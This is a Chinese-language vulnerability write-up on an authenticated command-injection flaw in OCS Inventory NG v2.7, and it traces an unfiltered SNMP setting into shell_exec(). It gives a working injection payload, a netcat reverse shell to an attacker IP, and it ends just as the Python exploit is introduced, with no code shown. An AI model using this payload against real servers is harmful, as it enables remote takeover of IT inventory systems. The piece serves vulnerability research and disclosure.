
# IT资产管理软件CS Inventory NG v2.7 RCE漏洞

![img](upload/attach/202008/214974_F8Y2EU83QBFPW27.jpg)

预计阅读时间：7 分钟

## OCS库存NG摘要

OCS-NG（Open Computer and Software Inventory Next Generation）是一款让用户对IT资产列表梳理的免费软件。可以收集装了OCS客户端程序的计算机硬件和软件的信息，然后通过Web界面将信息可视化。

## 关于漏洞利用

笔者在OCS软件内部的几个核心函数里发现了这个漏洞，有问题的函数负责处理SNMP设置并且可以控制没过滤的`SNMP_MIB_DIRECTORY`变量，与其他字符串连接后传给`shell_exec`函数执行。

经过身份验证后的用户可以设置这个选项，存储的变量没有被过滤，意味着笔者可以控制这个变量值写入恶意命令。

将恶意命令注入`SNMP_MIB_DIRECTORY`值之后，还需要访问另一个调用这个变量值的页面触发Payload实现运行SNMP_MIB文件，执行恶意命令的操作。

使用<a href="elink@e4eK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6E0K9r3q4K6K9$3q4J5i4K6u0r3f1V1y4q4f1$3y4S2L8X3&6W2M7R3`.`.">RCEScanner</a>脚本分析OCS代码里潜在的<a href="elink@43cK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6E0K9r3q4K6K9$3q4J5i4K6u0r3f1V1y4q4f1$3y4S2L8X3&6W2M7R3`.`.">RCE</a>漏洞结果如下：

![](upload/attach/202008/214974_M3UXUT5FTKC3GQG.png)

`CommandLine.php`文件内容，执行命令的代码在34、35行：

```
29 public function get_mib_oid($file) {
30 $oids = [];
31
32 $champs = array('SNMP_MIB_DIRECTORY' => 'SNMP_MIB_DIRECTORY');
33 $values = look_config_default_values($champs);
// 可控变量
34 $cmd = "snmptranslate -Tz -m ".$values['tvalue']['SNMP_MIB_DIRECTORY']."/".$file;
// 命令执行函数
35 $result_cmd = shell_exec($cmd);
36 $result_cmd = preg_split("/\r\n|\n|\r/", $result_cmd);
37 $result_cmd = str_replace('"', "", $result_cmd);
38
39 foreach ($result_cmd as $label => $oid) {
40 $split = preg_split('/\t/', $oid, null, PREG_SPLIT_NO_EMPTY);
41 if($split[0] != "") {
42 $oids[$split[0]] = $split[1];
43 }
44 }
45 return $oids;
46 }
```

函数`get_mid_oid()`带有一个`$file`的参数变量，内部没有内容过滤。此外还可以看到`$values`的变量后连接了`$file`直接传递给`shell_exec()`函数。而`$values`变量的内容是被`look_config_default_values()`的函数处理过的。

如果控制了一个没有过滤的变量，就能能够注入命令。

分析`require/function_commun.php`中的`look_config_default_values()`函数，可以找到以下代码：

```
function look_config_default_values($field_name, $like = '', $default_values = '') {
if ($like == '') {
$sql = "select NAME,IVALUE,TVALUE,COMMENTS from config where NAME in ";
$arg_sql = array();
$arg = mysql2_prepare($sql, $arg_sql, $field_name);
} else {
$arg['SQL'] = "select NAME,IVALUE,TVALUE,COMMENTS from config where NAME like '%s'";
$arg['ARG'] = $field_name;
}
$resdefaultvalues = mysql2_query_secure($arg['SQL'], $_SESSION['OCS']["readServer"], $arg['ARG']);
while ($item = mysqli_fetch_object($resdefaultvalues)) {
$result['name'][$item->NAME] = $item->NAME;
$result['ivalue'][$item->NAME] = $item->IVALUE;
$result['tvalue'][$item->NAME] = $item->TVALUE;
$result['comments'][$item->NAME] = $item->COMMENTS;
}
if (is_array($default_values)) {
foreach ($default_values as $key => $value) {
$key = strtolower($key);
if (is_array($value)) {
foreach ($value as $name => $val) {
if (!is_defined($result[$key][$name])) {
$result[$key][$name] = $val;
}
}
}
}
}
return $result;
}
```

`look_config_default_values()`函数作用是从数据库中查询数据（config表）并返回结果，这部分没有什么很有趣的地方，但是可以知道为什么从数据库里提取设置没过滤。

现在我们知道`get_mib_oid()`函数在核心PHP文件`ms_snmp_config.php`里被调用，片段代码如下：

```
if(isset($protectedPost['SUP_PROF']) && $protectedPost['SUP_PROF'] != ""){
// Remove config
$result_remove = $snmp->delete_config($protectedPost['SUP_PROF']);
unset($protectedPost['SUP_PROF']);
if($result_remove == true){
msg_success($l->g(572));
}else{
msg_error($l->g(573));
}
}
if(isset($protectedPost['update_snmp'])) {
$result_oids = $command->get_mib_oid($protectedPost['mib_file']);
$protectedPost['select_mib'] = true;
unset($protectedPost['update_snmp']);
}
```

PHP的完整文件路径是`“plugins/main_sections/ms_config/ms_snmp_config.php”`，可以看到`get_mib_oid()`函数被调用传递`“$protectedPost ['mib_file']”`作为参数。

代码先检查`“ update_snmp”`变量值是否在`ProtectedPost`数组中，如果存在就把`“$protectedPost ['mib_file']”`的变量值传递给容易受攻击的`“get_mib_oid()”`函数，之前的代码提到过函数`“ look_config_default_values()”`的输出是`$value`变量值。

现在如果可以控制`$protectedPost ['mib_file']`的值或`$values ['tvalue'] ['SNMP_MIB_DIRECTORY']`的值，就可以通过注入恶意代码来实现代码执行，但是前提是要了解输入的处理方式，检查有没有应用过滤器处理了这些输入。

经过进一步分析，发现`$protectedPost`数组是在`header.php`文件中声明的，如下所示：

```
//SECURITY
$protectedPost = strip_tags_array($_POST);
$protectedGet = strip_tags_array($_GET);
```

这两行代码会处理所有传入的GET请求、POST请求，并使用`strip_tags_array()`函数删除任何标签，转换成数组形式保存在`“$protectedGet”`、`“$protectedPost”`变量里。

在这里可以看到PHP代码里没有对外部请求做过滤，意味着可以把Payload注入到可以控制的变量`“$protectedPost ['mib_file']”`里。

为了再次确认没有额外的过滤，还需要分析`“require/function_commun.php”`中的`strip_tags_array（）`函数：

```
function strip_tags_array($value = '') {
if (is_object($value)) {
$value = get_class($value);
$value = strip_tags($value, "<p><b><i><font><br><center>");
$value = "Objet de la classe " . $value;
return $value;
}
$value = is_array($value) ? array_map('strip_tags_array', $value) : strip_tags($value, "<p><b><i><font><br><center>");
if(!is_array($value)){
$value = htmlspecialchars($value, ENT_QUOTES);
}
return $value;
}
```

从这段代码中可以看到函数作用是过滤输入中的某些标签，过滤后返回输出。

现在已经知道应用程序中有一个POST请求会传递给`strip_tags_array()`函数。然后发送并添加到`$protectedPost`数组中，现在只需要搞清楚在哪里发送可以保存这个变量值。

在深入研究应用程序之后，发现可以通过使用以下页面设置选项来控制`“$values ['tvalue']['SNMP_MIB_DIRECTORY']”`的值：

![](upload/attach/202008/214974_48XYHSDZ4UUCMKS.png)

当拦截请求时，可以看到以下内容：

![](upload/attach/202008/214974_K9VP3YCGR2FBJG5.png)

提交值后可以看到状态里的变量已更新完毕：

![](upload/attach/202008/214974_KBE539Y33WNE63T.png)

基于之前的分析，如果触发了`“get_mib_oid()”`函数，可以调用`“$values ['tvalue'] ['SNMP_MIB_DIRECTORY']”`值，在本例中为“Our Payload”，为了验证，添加一条PHP代码做调试语句，回显提交的值“ Our Payload”。

编辑`CommandLine.php`文件然后加入一行PHP代码，如下所示：

![](upload/attach/202008/214974_Q7N5698DBPYKKWF.png)

在深入研究应用程序之后，发现可以使用以下页面触发该函数：

![](upload/attach/202008/214974_ZPMXX5CRQ2FZZMA.png)

点击发送后，收到以下请求：

![](upload/attach/202008/214974_4SJWBTP6NJ4RRMC.png)

提交的`“ update_snmp”`值可以作为以下代码的判断条件：

```
if(isset($protectedPost['SUP_PROF']) && $protectedPost['SUP_PROF'] != ""){
// Remove config
$result_remove = $snmp->delete_config($protectedPost['SUP_PROF']);
unset($protectedPost['SUP_PROF']);
if($result_remove == true){
msg_success($l->g(572));
}else{
msg_error($l->g(573));
}
}
if(isset($protectedPost['update_snmp'])) {
$result_oids = $command->get_mib_oid($protectedPost['mib_file']);
$protectedPost['select_mib'] = true;
unset($protectedPost['update_snmp']);
}
```

网页里可以看到提交的值`“Our Payload”`打印在页面上：

![](upload/attach/202008/214974_F4NQVJRXUNJPR2C.png)

现在可以注入有效的命令语句来执行。

## 写Payload

提交的Payload进入`get_mib_oid()`函数会跟其他字符串串联在一起，类似于以下内容：

```
snmptranslate -Tz -m Our Payload!/
```

为了避免这种情况，需要将Payload更改为如下所示：

```
; Our Payload #
```

我们可以用netcat反向shell替换`“Our Payload”`，如下所示：

```
; ncat -e /bin/bash 172.16.147.1 1337 #
```

使用`“;”`转义命令，并在字符串后用`“＃”`注释掉多余的内容。

注入Payload然后触发。并且检查Netcat监听是否有回连：

![](upload/attach/202008/214974_QPM6JYWCTY6B9BU.png)

还需要通过访问此页面来触发

<mark class="encrypted">426K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5%4x3W2)9J5k6e0p5$3i4K6u0W2x3e0b7%4i4K6u0W2x3e0t1&6i4K6u0r3L8$3y4K6M7X3g2H3L8%4u0@1M7#2)9J5c8X3W2F1k6r3g2^5i4K6u0W2M7r3S2H3i4K6y4r3k6Y4g2F1j5%4c8A6L8$3&6Q4x3@1c8e0e0V1#2b7i4K6g2X3j5$3!0F1k6X3W2Y4</mark>

正如之前获得以下HTTP请求一样：

![](upload/attach/202008/214974_ZTKWTV9PB9VXD3D.png)

提交后可以在NetCat上获得以下内容：

![](upload/attach/202008/214974_J9WAGM7VYXV7T5V.png)

奥里给！弹出一个shell！

## 写Exploit

再编写一个利用程序实现自动利用，编写此EXP程序的过程中笔者玩得很开心，因为必须处理很多的CSRF令牌，表单和其他一些要求。

跟往常一样使用python编写漏洞利用程序，这是最终的exp代码：
